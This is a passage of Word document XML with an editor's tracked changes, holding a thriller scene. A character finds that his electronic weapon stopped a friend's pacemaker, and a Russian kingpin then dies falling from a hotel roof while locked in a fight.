          </w:rPr>
          <w:delText>the fallen body</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="3090" w:author="TextVet" w:date="2016-03-29T12:26:00Z">
        <w:r w:rsidR="00807B33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Sergey’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3091" w:author="TextVet" w:date="2016-03-29T12:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00807B33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Hi</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s hands made frantic, confused motions over </w:t>
      </w:r>
      <w:ins w:id="3092" w:author="TextVet" w:date="2016-03-29T12:27:00Z">
        <w:r w:rsidR="00F610F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3093" w:author="TextVet" w:date="2016-03-29T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F610F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> crumpled form. Bones had surely broken in the fall, but Danny could see no bullet wounds, no head trauma, nothing that would explain Sergey’s sudden collapse.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“Come on, man! Get up! What happened?”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grabbed his face in both hands, feeling the bristly skin of his cheeks, and rotated his head to face him. Sergey’s jaw was slack. Behind drooping lids, his eyes were misaligned and unfocused.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Across the helipad, the pilot managed to </w:t>
      </w:r>
      <w:del w:id="3094" w:author="TextVet" w:date="2016-03-29T12:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D13DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">safely </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ground his crippled vehicle</w:t>
      </w:r>
      <w:ins w:id="3095" w:author="TextVet" w:date="2016-03-29T12:28:00Z">
        <w:r w:rsidR="003D13DA" w:rsidRPr="003D13DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="003D13DA" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>safely</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Even as the chopper was still settling, the passenger door opened. Fine black shoes stepped out onto the concrete, matching the crisply</w:t>
      </w:r>
      <w:ins w:id="3096" w:author="TextVet" w:date="2016-03-29T12:30:00Z">
        <w:r w:rsidR="00D47E2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3097" w:author="TextVet" w:date="2016-03-29T12:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D47E2B">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pressed pants of a three-piece suit.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Danny drew his hands away from Sergey’s face, the white outlines of his fingers lingered on the Russian’s skin, like handprints in cement. Living flesh, with flowing blood and full capillaries, would’ve quickly regained color. Sergey’s didn’t.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grabbed a wrist and felt for a pulse. There was none. He tried to locate it on his neck, but to no avail. Sergey’s heart wasn’t beating.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“God, why!?” Danny shrieked. “For fuck’s sake, why!?”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pushed Sergey flat onto his back. </w:t>
      </w:r>
      <w:r w:rsidR="00153A79">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>His</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> trembling hands hurriedly undid the clasps and zippers of Sergey’s armor. Danny didn’t know CPR. What he did know, however, </w:t>
      </w:r>
      <w:ins w:id="3098" w:author="TextVet" w:date="2016-03-29T12:32:00Z">
        <w:r w:rsidR="00DC11C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>wa</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3099" w:author="TextVet" w:date="2016-03-29T12:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DC11C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s that the heart is just an electromechanical hydraulic pump. A machine. Surely it could be rebooted…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 pulled the armor away from Sergey’s torso, leaving him in a sweat-drenched button-down shirt. Danny curled his hand into a fist and raised it above his head, preparing to give a sharp blow to the sternum.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was then that he saw Sergey’s wounds.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Beneath a dense mat of chest hair, the skin bore long, pale scars, running along the left pectoral. They were thick and raised and slightly striated, resembling earthworms. Thin white branches extended from each line, indicating stitching. The scars were clearly surgical.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on the left side of his chest, below the shoulder, the flesh was raised in the outline of a smooth round disc, about two inches across, implanted beneath the skin.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pacemaker.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felt the blood rush from his face. He looked at his HERF gun. His stomach lurched.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dear God, no…”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brought his fist down on Sergey’s chest. </w:t>
      </w:r>
      <w:r w:rsidRPr="00003813">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3100" w:author="TextVet" w:date="2016-03-29T12:35:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“No!”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> he screamed, and raised his fist again. “No no </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” He pounded futilely on motionless ribs. Eventually, his fist slowed and his arm weakened, and he brought it to rest softly upon Sergey’s lifeless body. His head followed, curling downward to rest his forehead upon Sergey’s chest. “I’m sorry… I’m so, so sorry…”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somewhere nearby, Danny heard laughter. It was dry and dark. It was laughter dripping with condescension and schadenfreude, a chortling cackle of evil victory.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Kneeling over Sergey’s body, Danny looked up with red, moist eyes.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Before him stood Ivan Zheleznov</w:t>
      </w:r>
      <w:r w:rsidR="00003813">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00003813">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is mouth spread wide in a horrid grin. In his hand, his gun glinted in the helipad landing lights.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w:t>
      </w:r>
      <w:ins w:id="3101" w:author="TextVet" w:date="2016-03-29T12:38:00Z">
        <w:r w:rsidR="00331519">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>frozen</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3102" w:author="TextVet" w:date="2016-03-29T12:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00331519">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>on his knees</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, watched the laughing Russian kingpin raise the firearm and point it at him. Unblinking, he saw the barrel aim between his eyes.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deafening bang resounded across the rooftop.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fell sideways.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As he dropped away, the first thing Danny saw, several yards behind him, was a small silver revolver with a short, squat barrel with an enormous opening.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was held by Eugene Mukhayev.</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athletic man stood uneasily, halfway doubled over. His body quivered</w:t>
      </w:r>
      <w:ins w:id="3103" w:author="TextVet" w:date="2016-03-29T12:39:00Z">
        <w:r w:rsidR="002216A2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3104" w:author="TextVet" w:date="2016-03-29T12:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002216A2">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his face was pale</w:t>
      </w:r>
      <w:ins w:id="3105" w:author="TextVet" w:date="2016-03-29T12:39:00Z">
        <w:r w:rsidR="002216A2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3106" w:author="TextVet" w:date="2016-03-29T12:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002216A2">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his eyes darted uncontrollably. The revolver shook in his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lay on the smooth concrete, bleeding from the leg. He turned to face Eugene, and fired off a few shots.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grunted as the bullets hit his armored body, but remained standing. He took aim.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tried to scramble to his feet, but succeeded only in a rapid half-crawl.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Eugene’s revolver let out another boom, then another. Fire spat forth from the large black opening. But his hand was shaking too violently to aim at a moving target. The shots chipped away concrete near Ivan, but none managed to hit him. Out of bullets, Eugene charged forward.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Ivan limped away, trying to flee. His bleeding leg left a </w:t>
      </w:r>
      <w:commentRangeStart w:id="3107"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crimson</w:t>
      </w:r>
      <w:commentRangeEnd w:id="3107"/>
      <w:r w:rsidR="00761EBE">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="3107"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> trail across the helipad’s surface.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slammed into him at full sprint, checking his shoulder into the small of the limping kingpin’s back. He knocked him forward past the edge of the helipad, toward the stone balustrade that ringed the top of the building.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Ivan continued trying to crawl away, Eugene grabbed him by his three-piece suit and threw him against the concrete rail.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two of them wrestled against the balusters. Eugene fought not only against the aging kingpin but also against his own body, which misinterpreted the commands of his mind into spastic, sloppy motions. His neurons misfired and short-circuited like frayed electrical wires, sending his muscles twitching and twisting against his will. His extensive martial skills failed him, as his malfunctioning brain proved incapable of translating his thoughts into coherent action.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Ivan, wounded and bleeding, pulled himself up on Eugene’s armor. He lacked Eugene’s strength and training, but the old kingpin was a twisty, writhing thing, and he </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">resisted Eugene’s attempts to grapple him. </w:t>
      </w:r>
      <w:ins w:id="3108" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidR="0051110E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>S</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3109" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0051110E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>In his hand he s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>till wield</w:t>
      </w:r>
      <w:ins w:id="3110" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidR="0051110E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3111" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0051110E">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the glinting gun</w:t>
      </w:r>
      <w:ins w:id="3112" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidR="0051110E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3113" w:author="TextVet" w:date="2016-03-29T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0051110E">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he tried repeatedly to put it to Eugene’s head.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Herculean exertion and mental focus, Eugene managed to overcome the waves of convulsions long enough to get an arm around Ivan’s neck, trapping him in a headlock.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aging kingpin writhed and bucked, but couldn’t slip out of the hold. He pushed and kicked</w:t>
      </w:r>
      <w:del w:id="3114" w:author="TextVet" w:date="2016-03-29T12:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E122E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with his legs</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, trying to make Eugene stumble.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stabilized himself by pushing his back against the waist-high balustrade. With his arm around Ivan’s neck, he grabbed his own elbow with his opposite hand and squeezed.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Ivan, weakening, lifted his </w:t>
      </w:r>
      <w:del w:id="3115" w:author="TextVet" w:date="2016-03-29T12:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026287F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">glinting </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>handgun over his head and pressed the muzzle against Eugene’s temple.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Ivan’s neck still in his arms and the stone balustrade behind him, knowing that a shot from Ivan’s gun was imminent, Eugene leaned backward. Together, they tipped over the rim of the roof of the Medina Gallante.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raced toward the point from where they</w:t>
      </w:r>
      <w:ins w:id="3116" w:author="TextVet" w:date="2016-03-29T13:36:00Z">
        <w:r w:rsidR="00136016">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f</w:t>
      </w:r>
      <w:ins w:id="3117" w:author="TextVet" w:date="2016-03-29T13:36:00Z">
        <w:r w:rsidR="00136016">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3118" w:author="TextVet" w:date="2016-03-29T13:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00136016">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ll</w:t>
      </w:r>
      <w:ins w:id="3119" w:author="TextVet" w:date="2016-03-29T13:36:00Z">
        <w:r w:rsidR="00136016">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>en</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He hurried past the helicopter, whose blades had slowed to a smooth, silent rotation; inside, the pilot sat low in his seat, trying desperately to call for help on his nonfunctional radio. Danny hopped down from the helipad onto the asphalt rooftop and dashed to the balustrade nearby, streaked with blood.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dozen stories beneath him, past rows of windows and the dark green thicket of the surrounding pine canopy, Ivan Zheleznov and Eugene Mukhayev lay motionless upon the stone tiles of a wide pavilion. A dark crimson pool spread outward. Their bodies, broken and lifeless, remained locked in battle.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crowd began </w:t>
      </w:r>
      <w:del w:id="3120" w:author="TextVet" w:date="2016-03-29T13:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0035065D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:ins w:id="3121" w:author="TextVet" w:date="2016-03-29T13:39:00Z">
        <w:r w:rsidR="0035065D">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around them — hotel guests, staff, and a growing number of police. Danny ducked away when he noticed </w:t>
      </w:r>
      <w:r w:rsidR="008E5C4E">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>some</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> looking upward.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Thumping noises in the distance </w:t>
      </w:r>
      <w:ins w:id="3122" w:author="TextVet" w:date="2016-03-29T13:40:00Z">
        <w:r w:rsidR="000F7501">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>made</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3123" w:author="TextVet" w:date="2016-03-29T13:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F7501">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>alerted</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him </w:t>
      </w:r>
      <w:del w:id="3124" w:author="TextVet" w:date="2016-03-29T13:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F7501">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">look around. </w:t>
      </w:r>
      <w:ins w:id="3125" w:author="TextVet" w:date="2016-03-29T13:41:00Z">
        <w:r w:rsidR="00C37636">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3126" w:author="TextVet" w:date="2016-03-29T13:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C37636">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>In the sky, a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">bove the wooded suburban skyline, multiple helicopters closed in on the Medina Gallante. In the waters of Lake Washington, patrol boats approached the hotel’s wharf. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
